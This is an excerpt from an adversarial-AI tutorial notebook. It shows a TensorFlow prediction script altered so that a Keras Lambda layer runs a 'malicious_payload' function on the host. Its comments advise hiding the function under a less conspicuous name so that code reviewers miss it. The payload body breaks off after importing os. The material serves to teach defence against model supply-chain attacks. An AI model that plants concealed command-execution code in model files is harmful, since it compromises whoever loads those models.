...
This notebook ***(tf_make_predictions_pwnd_script_lambda.py)*** is part of the series of notebooks From ***A Little Book on Adversarial AI***  A free ebook released by Nik Alleyne

'''

# THIS IS US MODIFYING THE ORIGINAL SCRIPT
# Original script is: tf_make_predictions_base_script.py
...
# Now unless the organization is constantly reviewing this code, this will go unnoticed
# Clear any custom objects registered with Keras
tf.keras.utils.get_custom_objects().clear()

# Keep in mind, we are only giving this function this name to be obvious.
# In a production environment, this function would be named something less conspicuous
# This function is designed to execute a command on the host system
...
def malicious_payload(incoming_tensor, command=None):
    import os
